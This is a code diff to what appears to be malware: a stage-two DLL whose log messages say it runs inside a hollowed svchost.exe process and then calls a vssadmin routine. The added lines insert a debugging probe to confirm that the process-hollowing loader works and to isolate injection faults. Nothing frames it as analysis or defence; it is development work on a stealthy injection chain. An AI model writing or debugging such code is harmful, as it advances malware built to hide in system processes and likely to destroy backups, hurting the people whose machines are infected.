@@ -434,8 +434,16 @@ static void DoCleanup(void) {
 // _CRT_INIT once before DllEntry.
 __declspec(dllexport) BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
+        // ponytail: FIRST action is a kernel32-only probe — GetTickCount + CreateFileW.
+        // No user32/advapi/etc deps, no CRT, no TLS. If this line lands in cache.dat,
+        // the hollow ran and stack alignment is OK; if it's missing, the fault is
+        // earlier than any stage2 code (entry RVA wrong, CRT wrapper fires, or
+        // movaps fault on Rsp). This isolates the loader.c fix from stage2 logic.
+        DWORD probe = GetTickCount();
+        wchar_t probeMsg[64];
+        wsprintfW(probeMsg, L"[*] DllEntry entered (probe tick=%lu, before any deps)", probe);
+        LogMessage(probeMsg);
         DisableThreadLibraryCalls(hinstDLL);
-        LogMessage(L"[*] DllEntry entered (self-check: hollow ran, before LoadDeps)");
         LoadDeps();
         LogMessage(L"[*] Stage2 started (inside hollowed svchost.exe)");
         DoVssadmin();
